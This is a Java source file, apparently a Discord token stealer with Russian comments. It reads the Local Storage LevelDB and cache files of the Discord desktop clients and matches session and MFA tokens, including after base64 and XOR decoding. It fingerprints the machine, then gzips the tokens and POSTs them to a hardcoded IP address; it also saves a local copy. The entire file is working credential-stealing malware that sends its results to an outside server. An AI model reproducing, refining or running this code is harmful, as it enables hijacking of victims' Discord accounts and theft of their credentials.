import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.regex.*;
import java.net.*;
import java.util.zip.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;

public class TokenExtractor {
    private static final String OUTPUT_DIR = System.getenv("TEMP") + "\\SWILL_DEC\\extracted";
    private static final String SERVER_URL = "http://26.184.88.227:8891/upload_tokens";
    
    // ТОЧНЫЕ паттерны для Discord токенов (взяты из рабочих грабберов)
    private static final String[] TOKEN_REGEX = {
        "([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27})",           // Стандартный Discord токен
        "(mfa\\.[\\w-]{84})",                               // MFA токен
        "([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}_[\\w-]{6})"  // Альтернативный формат
    };
    
    private static Set<String> foundTokens = new LinkedHashSet<>();
    private static String hwid = getHWID();
    private static int totalFilesScanned = 0;
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[TokenExtractor][" + timestamp + "] " + msg);
    }
    
    private static void logSuccess(String msg) {
        System.out.println("[TokenExtractor] ✅ " + msg);
    }
    
    public static void main(String[] args) {
        log("=== Discord Token Extractor FINAL ===");
        log("HWID: " + hwid);
        
        new File(OUTPUT_DIR).mkdirs();
        
        // 1. Поиск в LevelDB Discord
        String appdata = System.getenv("APPDATA");
        if (appdata != null) {
            String[] discordVersions = {"discord", "discordptb", "discordcanary"};
            for (String version : discordVersions) {
                String leveldbPath = appdata + "\\" + version + "\\Local Storage\\leveldb";
                File leveldbDir = new File(leveldbPath);
                if (leveldbDir.exists() && leveldbDir.isDirectory()) {
                    log("Scanning: " + leveldbPath);
                    scanLevelDB(leveldbDir);
                } else {
                    log("Not found: " + leveldbPath);
                }
            }
        }
        
        // 2. Поиск в старых кэшах Discord (если есть)
        String localAppdata = System.getenv("LOCALAPPDATA");
        if (localAppdata != null) {
            String[] cachePaths = {
                localAppdata + "\\Discord\\Cache",
                localAppdata + "\\discordptb\\Cache",
                localAppdata + "\\discordcanary\\Cache"
            };
            for (String path : cachePaths) {
                File cacheDir = new File(path);
                if (cacheDir.exists()) {
                    log("Scanning cache: " + path);
                    scanCacheFiles(cacheDir);
                }
            }
        }
        
        // Результаты
        log("=========================================");
        log("Files scanned: " + totalFilesScanned);
        log("Tokens found: " + foundTokens.size());
        log("=========================================");
        
        if (!foundTokens.isEmpty()) {
            for (String token : foundTokens) {
                logSuccess("Token: " + maskToken(token));
            }
            sendToServer();
            saveLocal();
        } else {
            log("No Discord tokens found. Possible reasons:");
            log("1. Discord not installed on this PC");
            log("2. User never logged into Discord");
            log("3. Discord was reinstalled and old files deleted");
            sendEmptyReport();
        }
        
        log("=== TokenExtractor finished ===");
    }
    
    private static void scanLevelDB(File dir) {
        File[] files = dir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
        if (files == null || files.length == 0) return;
        
        log("Found " + files.length + " LevelDB files");
        
        for (File f : files) {
            totalFilesScanned++;
            scanFileForTokens(f);
        }
    }
    
    private static void scanCacheFiles(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        int count = 0;
        for (File f : files) {
            if (f.isFile() && f.length() > 1000 && f.length() < 500000) {
                totalFilesScanned++;
                scanFileForTokens(f);
                count++;
                if (count > 50) break; // Ограничиваем для скорости
            }
        }
        log("Scanned " + count + " cache files");
    }
    
    private static void scanFileForTokens(File file) {
        try {
            byte[] data = Files.readAllBytes(file.toPath());
            
            // Метод 1: Поиск в строковом представлении
            String content = new String(data);
            searchInText(content, file.getName());
            
            // Метод 2: Поиск после декодирования Base64
            String base64Decoded = decodeBase64FromText(content);
            if (!base64Decoded.equals(content)) {
                searchInText(base64Decoded, file.getName() + "[base64]");
            }
            
            // Метод 3: Поиск после XOR с ключом (если зашифровано)
            byte[] xorDecrypted = xorDecrypt(data, "SwillWay2025Key42".getBytes());
            String xorContent = new String(xorDecrypted);
            if (!xorContent.equals(content)) {
                searchInText(xorContent, file.getName() + "[xor]");
            }
            
            if (totalFilesScanned % 50 == 0) {
                log("Progress: " + totalFilesScanned + " files scanned, " + foundTokens.size() + " tokens found");
            }
            
        } catch (Exception e) {
            // Игнорируем ошибки чтения
        }
    }
    
    private static void searchInText(String text, String source) {
        for (String regex : TOKEN_REGEX) {
            Pattern p = Pattern.compile(regex);
            Matcher m = p.matcher(text);
            while (m.find()) {
                String token = m.group();
                if (isValidToken(token)) {
                    if (foundTokens.add(token)) {
                        logSuccess("Found in " + source + ": " + maskToken(token));
                    }
                }
            }
        }
    }
    
    private static String decodeBase64FromText(String text) {
        StringBuilder result = new StringBuilder(text);
        Pattern b64pattern = Pattern.compile("[A-Za-z0-9+/]{80,}={0,2}");
        Matcher m = b64pattern.matcher(text);
        while (m.find()) {
            String b64 = m.group();
            try {
                byte[] decoded = Base64.getDecoder().decode(b64);
                String decodedStr = new String(decoded);
                if (decodedStr.contains(".") && decodedStr.length() > 50 && decodedStr.length() < 200) {
                    result.append("\n").append(decodedStr);
                }
            } catch (Exception e) {}
        }
        return result.toString();
    }
    
    private static byte[] xorDecrypt(byte[] data, byte[] key) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }
    
    private static boolean isValidToken(String token) {
        if (token == null) return false;
        // Discord токен должен быть длиной около 59 символов
        if (token.length() < 50 || token.length() > 70) return false;
        // Должен содержать 2 точки
        if (token.chars().filter(ch -> ch == '.').count() != 2) return false;
        // Не должен содержать пробелов и спецсимволов
        if (token.contains(" ") || token.contains("\n") || token.contains("\r")) return false;
        if (token.contains("{") || token.contains("}")) return false;
        return true;
    }
    
    private static String maskToken(String token) {
        if (token == null || token.length() < 20) return token;
        return token.substring(0, 15) + "..." + token.substring(token.length() - 5);
    }
    
    private static void sendToServer() {
        log("Sending " + foundTokens.size() + " tokens to server...");
        HttpURLConnection conn = null;
        
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("HWID: ").append(hwid).append("\n");
            sb.append("Timestamp: ").append(LocalDateTime.now()).append("\n");
            sb.append("Type: DISCORD_TOKENS\n");
            sb.append("Count: ").append(foundTokens.size()).append("\n\n");
            
            for (String token : foundTokens) {
                sb.append(token).append("\n");
            }
            
            String payload = sb.toString();
            byte[] compressed = compress(payload);
            
            URL url = new URL(SERVER_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.setRequestProperty("Content-Type", "text/plain");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            
            int code = conn.getResponseCode();
            if (code == 200) {
                logSuccess("Tokens sent successfully!");
            } else {
                log("Server response: HTTP " + code);
            }
            
        } catch (Exception e) {
            log("Send error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    private static void sendEmptyReport() {
        HttpURLConnection conn = null;
        try {
            String payload = "HWID: " + hwid + "\nStatus: NO_TOKENS_FOUND\nDiscord may not be installed";
            byte[] compressed = compress(payload);
            URL url = new URL(SERVER_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            conn.getResponseCode();
        } catch (Exception e) {}
        finally { if (conn != null) conn.disconnect(); }
    }
    
    private static void saveLocal() {
        try {
            StringBuilder sb = new StringBuilder();
            for (String token : foundTokens) {
                sb.append(token).append("\n");
            }
            String path = OUTPUT_DIR + "\\discord_tokens.txt";
            Files.write(Paths.get(path), sb.toString().getBytes());
            log("Tokens saved to: " + path);
        } catch (Exception e) {}
    }
    
    private static byte[] compress(String str) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(bos);
        gzip.write(str.getBytes());
        gzip.close();
        return bos.toByteArray();
    }
    
    private static String getHWID() {
        try {
            Process p = Runtime.getRuntime().exec("wmic csproduct get uuid");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("-")) return line.trim();
            }
        } catch (Exception e) {}
        return "UNKNOWN_" + System.getProperty("user.name");
    }
}
